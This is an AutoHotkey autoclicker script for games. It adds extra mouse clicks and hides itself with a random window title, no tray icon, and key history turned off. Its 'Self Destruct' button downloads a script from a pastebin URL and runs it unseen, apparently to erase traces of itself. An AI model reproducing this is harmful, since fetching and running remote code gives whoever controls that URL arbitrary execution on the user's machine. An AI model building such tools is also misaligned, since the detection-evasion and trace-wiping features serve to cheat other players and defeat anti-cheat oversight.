;####################################### - Configs
IfNotExist, config.ini
{
	save(6, 6, 20, 20)
}
IfExist, config.ini
{
	IniRead, ini_left, config.ini, Config, Left
	IniRead, ini_left_max, config.ini, Config, Left_Max
	IniRead, ini_right, config.ini, Config, Right
	IniRead, ini_right_max, config.ini, Config, Right_Max
}
else
{
	Reload
}
;####################################### - Options
#NoEnv
#MaxHotkeysPerInterval 99000000
#HotkeyInterval 99000000
#MaxThreadsPerHotkey 255
#KeyHistory 0
#NoTrayIcon
DetectHiddenWindows, On
ListLines Off
Process, Priority, , A
SetBatchLines, 0
SetKeyDelay, 0, 0
SetMouseDelay, 0
SetDefaultMouseSpeed, 0
SetWinDelay, 0
SetWorkingDir %A_ScriptDir%
SendMode Input
;####################################### - Gui
Gui, Add, Text, x12 y69 w60 h20 , Assist CPS:
Gui, Add, Text, x12 y99 w60 h20 , Max A CPS:
Gui, Add, GroupBox, x2 y-1 w460 h50 , Settings
Gui, Add, Slider, x82 y69 w370 h20 Range1-16 +ToolTip vleft AltSubmit gupdate, %ini_left%
Gui, Add, Slider, x82 y99 w370 h20 Range1-40 +ToolTip vleft_max AltSubmit gupdate, %ini_left_max%
Gui, Add, Slider, x82 y149 w368 h21 Range1-16 +ToolTip vright AltSubmit gupdate, %ini_right%
Gui, Add, Slider, x82 y179 w368 h21 Range1-40 +ToolTip vright_max AltSubmit gupdate, %ini_right_max%
Gui, Add, Text, x12 y149 w60 h20 , Assist CPS:
Gui, Add, Text, x12 y179 w60 h20 , Max A CPS:
Gui, Add, Button, x352 y19 w100 h20 gGuiClose, Exit
Gui, Add, Button, x232 y19 w100 h20 gselfDestruct, Self Destruct
Gui, Add, CheckBox, x12 y19 w90 h20 gupdate vleft_c, - Left
Gui, Add, CheckBox, x122 y19 w90 h20 gupdate vright_c, - Right
Gui, Add, GroupBox, x2 y49 w460 h80 , Left
Gui, Add, GroupBox, x2 y129 w460 h80 , Right
Random, ran, 30, 40
name := ranString(ran)
Gui, Show, w464 h210, %name%
left_cps = 0
right_cps = 0
OnExit, GuiClose
Goto, Looping
return
;####################################### - Code
update:
Gui, submit, nohide
return

Looping:
Loop
{
	Sleep, 1000
	left_cps = 0
	right_cps = 0
	
}
return

~$*LButton::
	if(left_c == 1)
		{
		left_cps += 1
		l_m := left_max / 2
		if(left_cps >= left and left_cps <= l_m)
		{
			Click
		}
	}
return

~$*RButton::
	if(right_c == 1)
		{
		right_cps += 1
		r_m := right_max / 2
		if(right_cps >= right and right_cps <= r_m)
		{
			Click, Right
		}
	}
return
;####################################### - Functions
save(left, right, left_max, right_max)
{
	IniWrite, %left%, config.ini, Config, Left
	IniWrite, %left_max%, config.ini, Config, Left_Max
	IniWrite, %right%, config.ini, Config, Right
	IniWrite, %right_max%, config.ini, Config, Right_Max
}

ranString(length) {
	characters := "0123456789abcdefghijklmnopqurstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ" 
	StringSplit, chars, characters
	Loop, %length%
	{
		Random, ran, 1, 62
		random .= chars%ran%
	}
	return random
}

;####################################### - Exit
GuiClose:
Gui, submit, nohide
save(left, right, left_max, right_max)
ExitApp
return
;####################################### - Self Destruct
selfDestruct:
Random, s_r, 20, 30
sd_name := ranString(s_r)
FileAppend, %A_ScriptFullPath%`n%sd_name%, %sd_name%.%sd_name%
URLDownloadToFile, https://pastebin.com/raw/Ebc34NYE, %sd_name%.ahk
Sleep, 5000
Run, %sd_name%.ahk
Sleep, 10
ExitApp
return